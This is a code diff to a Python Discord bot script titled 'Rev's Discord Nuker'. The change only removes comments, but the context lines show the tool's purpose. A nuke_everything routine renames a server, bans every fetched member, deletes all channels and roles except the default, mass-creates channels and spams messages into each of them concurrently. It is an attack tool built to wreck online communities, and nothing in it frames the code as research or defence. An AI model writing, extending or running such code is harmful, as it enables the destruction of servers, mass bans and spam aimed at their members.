@@ -5,12 +5,11 @@ from pystyle import Center, Anime, Colors, Colorate, Write, System
 from time import sleep
 import os
 
-# Force terminal size and clear
+
 os.system('mode con: cols=140 lines=45')
 System.Clear()
 System.Title("Rev's Discord Nuker")
 
-# First ASCII art - PROPERLY CENTERED
 banner = r"""
                                       /$$$$$$  /$$           /$$$$$$$$ /$$                        
                                      /$$__  $$|__/          | $$_____/| $$                        
@@ -22,9 +21,9 @@ banner = r"""
                                     |__/  |__/|__/|__/      |__/      |__/ \______/  \_____/\___/   
 """
 
-# Display centered animated banner
+
 Anime.Fade(banner, Colors.red_to_yellow, Colorate.Vertical, enter=True)
-sleep(2)  # Show banner for 2 seconds
+sleep(2)  
 System.Clear()
 
 intents = discord.Intents.default()
@@ -68,7 +67,6 @@ async def nuke_everything(guild, new_name, channels_to_create, spam_message):
     except Exception as e:
         Write.Print(f"Failed to rename server: {e}\n", Colors.red_to_yellow, interval=0.001)
 
-    # Ban members concurrently
     ban_tasks = []
     async for member in guild.fetch_members(limit=None):
         if member != guild.me:
@@ -82,7 +80,6 @@ async def nuke_everything(guild, new_name, channels_to_create, spam_message):
         except Exception as e:
             Write.Print(f"Failed to ban user: {e}\n", Colors.red_to_yellow, interval=0.001)
 
-    # Delete channels concurrently
     delete_channel_tasks = [asyncio.create_task(channel.delete()) for channel in guild.channels]
     for task in delete_channel_tasks:
         try:
@@ -91,7 +88,6 @@ async def nuke_everything(guild, new_name, channels_to_create, spam_message):
         except Exception as e:
             Write.Print(f"Failed to delete a channel: {e}\n", Colors.red_to_yellow, interval=0.001)
 
-    # Delete roles concurrently (except top/default)
     delete_role_tasks = []
     for role in guild.roles:
         if role != guild.me.top_role and not role.is_default():
@@ -103,7 +99,6 @@ async def nuke_everything(guild, new_name, channels_to_create, spam_message):
         except Exception as e:
             Write.Print(f"Failed to delete a role: {e}\n", Colors.red_to_yellow, interval=0.001)
 
-    # Create channels concurrently
     create_tasks = []
     created_channels = []
     for i in range(channels_to_create):
@@ -116,7 +111,6 @@ async def nuke_everything(guild, new_name, channels_to_create, spam_message):
         except Exception as e:
             Write.Print(f"Failed to create channel: {e}\n", Colors.red_to_yellow, interval=0.001)
 
-    # Spam messages concurrently per channel
     spam_tasks = []
     for channel in created_channels:
         spam_tasks.append(asyncio.create_task(spam_in_channel(channel, spam_message)))
